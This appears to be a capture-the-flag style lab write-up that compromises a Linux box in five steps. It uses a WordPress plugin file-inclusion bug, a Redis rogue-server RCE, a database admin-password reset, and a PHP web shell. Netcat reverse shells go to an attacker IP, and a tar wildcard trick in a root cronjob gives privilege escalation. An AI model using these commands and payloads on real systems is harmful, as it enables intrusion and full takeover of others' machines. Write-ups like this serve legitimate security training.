#box

*Created: 1/4/2026*

### Step 1

**Tags:** #Path-Traversal #Web-Applications #Common-Applications #Wordpress #WPScan #WP-Plugin #Redis

🔗 **URL/Link:** https://www.exploit-db.com/exploits/44340

**Command:**
```bash
curl http://192.168.193.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf -s | egrep requirepass
```

*Port: 80*

> 
> Discovering the presence of a WP Instance on port 80 we run a WPScan and find a Plugin called site-editor. Searching for a vulnerability we discover a LFI vulnerability

---

### Step 2

**Tags:** #Redis #redis-rogue-server

🔗 **URL/Link:** https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#redis-rce

**Command:**
```bash
python3 redis-rogue-server.py --rhost 192.168.193.166 --rport 6379 --lhost 192.168.45.245 --lport 6379 --password 'Ready4Redis?'
```

*Port: 6379 | Asciinema Cast: [Step 2](attachments/Readys-1.cast)*

> 
> Targeting the redis.conf file we discover the presence of the redis password, namely: `Ready4Redis?` We use the master-slave replication attack to inject a malicious module and gain RCE

---

### Step 3

**Tags:** #Common-Applications #Web-Applications #Wordpress #MySQL #SQLi

**Command:**
```bash
# Connecting to MySQL and updating the admin password with MD5()

mysql -u karl -pWordpress1234 -h localhost -e "use wordpress; update wp_users set user_pass = MD5('admin') where ID=1;"
```

*Port: 3306*

> 
> On the target machine we discover the presence of a mysql instance. We find out on /var/www/html/wp-config.php the credentials `karl:Wordpress1234`. We authenticate to the database and find out on wordpress.wp_users the presence of an admin password with the MD5 Wordpress password. Being unable to crack it, we decide to update it to then authenticate to WP Administration panel

---

### Step 4

**Tags:** #Common-Applications #Web-Applications #Wordpress #Web-Shell #PHP #Shells

**Command:**
```php
<?php if(isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?>
```

*Port: 80*

> 
> With the password updated we can now inject a webshell into Wordpress Admin Panel -> Appearance -> Theme Editor (here we picked `index.php` since it's reachable easily)
> 
> Uploaded the shell, we now shall have RCE by using `curl` at the following address:
> 
> `curl http://192.168.193.166/index.php?cmd=id`
> 
> We shall now be able to get a shell with:
> 
> `curl --data-urlencode="cmd=nc 192.168.45.245 22 -e /bin/bash" http://192.168.193.166/index.php`

---

### Step 5

**Tags:** #tar #binaries #Linux #UNIX-Wildcard

🔗 **URL/Link:** https://www.exploit-db.com/papers/33930

**Command:**
```bash
touch ./'--checkpoint=1'
touch ./'--checkpoint-action=exec=sh shell.sh'
echo -ne '#!/bin/bash\n\nnc 192.168.45.245 22 -e /bin/bash\n' > shell.sh; chmod 777 shell.sh
```

> 
> Once obtained a shell from WP, we'll figure out that we have a shell as `alice`  another user of the machine. Re-doing the enumeration we'll discover the presence of a `backups.sh`  file which is being ran every 3 mins from `/etc/crontab`  as root. The script ran uses tar on `/var/www/html`. This permits us to use a Unix Wildcard to achieve command execution as root.
> 
> The cronjob is as follows:
> 
> `*/3 * * * * root /usr/local/bin/backup.sh`
> 
> Every 3 minute the following shell file is being launched.
> Printing that file shows the following bash code:
> 
```bash
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
   tar -cf /opt/backups/website.tar *
fi
```
> 
> This bash code does:
> * cd inside /var/www/html
> * Searches all the files modified in the last 3 minutes and checks whether the word counts of that files is > 0
> * If that condition above is true, it zips ALL `*` the content of that folder into a file at `/opt/backups/website.tar`
> 
> Now, the zip part is not particularly interesting but we know that `tar` suffers from a [Unix Wildcard vulnerability](https://www.exploit-db.com/papers/33930#:~:text=%3D%3D%3D%5B%204%2E3%20Tar%20arbitrary%20command%20execution) that permits us to gain code execution under some circustances.
> To do so, we must create a malicious shell file (and give it `chmod`!) and create two particular files with the exact following text. In total we'll have:
> * `shell.sh`
> * `--checkpoint=1`
> * `--checkpoint-action=exec=sh shell.sh`
> 
> The last two files will be empty, but will instruct `tar` to , at the first checkpoint, execute the file `shell.sh` with `sh` (thus, as a shell file).
> 
> `shell.sh` will have the following content:
```bash
#!/bin/bash

nc 192.168.45.245 22 -e /bin/bash
```
> 
> We'll then use `chmod 777 shell.sh` to make it executable and wait until the cronjob is ran, getting a root shell.

---

